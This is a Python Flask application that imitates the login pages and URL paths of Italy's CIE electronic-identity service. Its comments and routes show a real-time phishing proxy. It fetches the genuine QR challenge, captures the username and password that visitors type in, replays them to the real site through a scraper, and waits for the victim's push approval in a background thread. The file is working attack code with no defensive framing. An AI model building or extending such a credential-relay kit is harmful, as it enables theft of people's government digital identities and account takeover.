from flask import Flask, jsonify, redirect, render_template, request, url_for
import random
from utils.state import State
import utils.scraping as scraping
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

random.seed()

def todo():
    return "<b>TO BE IMPLEMENTED</b>"

state = State()
scraper: scraping.Scraper

# QR code functioning:
# when we press "login with CIE", we get redirected to a login page
# with some parameters, one of them being the challenge. With this
# challenge the website generates the QR code (qr source is @ line
# 490 in login_cie.html). Perhaps the best course of action is to 
# simply do the login and pass that field as argument to login_cie,
# so that it can display the correct QR code

@app.route('/')
def landing_page():
    return render_template('landing_page.html', node = str(random.randrange(1, 7)))

# The idea is: pressing the 'login with CIE' button will redirect here,
# which will actually do the same on the original website, which will give
# us the valid qr code, and then THIS page will redirect to the login_page
# with the valid challenge and qr code
@app.route('/do_login/', methods = ["POST", "GET"])
def do_login():
    elements = scraper.get_cie_page_elements()
    challenge = elements.get("challenge", "NA")
    qr_str = elements.get("qr_str", "NA")
    op_id = elements.get("op_id", "NA")
    return redirect(url_for('cie_level2', lang='it', challenge = challenge, qr_str = qr_str, op_id = op_id))

@app.route('/idp/login/sessionClosure')
def cie_error():
    return render_template('cie_error_it')

@app.route('/idp/login/livello2/', methods=['GET', 'POST'])
def cie_level2():
    challenge = request.args.get('challenge')
    lang = request.form.get('lang', "it")
    # the original website does not change url throughout the login process, so we emulate that
    # by using the same website and checking the arguments
    if challenge == None:
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        result = scraper.perform_login(username, password)

        page = "{p}_{lang}.html".format(
            p = "cie_waiting_push" if result else "cie_wrong_credentials",
            lang = "deu" if lang == "deu" else "it"
        )
        if result:
            executor = ThreadPoolExecutor(max_workers=2)
            _ = executor.submit(scraper.approve, 120)

        return render_template(page)

    qr_str = request.args.get('qr_str')
    page = "{p}_{lang}.html".format(
        p = "wrong_credentials_cie" if state.wrong_credentials else "cie_login",
       lang = "deu" if lang == "deu" else "it"
   )

    return render_template(page, qr_str = qr_str, challenge = challenge)

@app.route("/idp/login/livello1e2checkpush")
def check_push():
    if scraper.push_approved:
        return jsonify({"status": "OK"})
    return jsonify({"status": "WAIT"})


@app.route("/idp/login/livello1e2postpush")
def cie_push_approved():
    return render_template("cie_error_it.html")

@app.route('/idp/login/livello1e2postqrcode')
def cie_qr_code_approved():
    return todo()

@app.route('/test')
def test():
    return render_template("cie_error_it.html")

if __name__ == '__main__':
    scraper = scraping.Scraper()
    app.run(debug=True, host='0.0.0.0', port=5000, use_reloader = False)
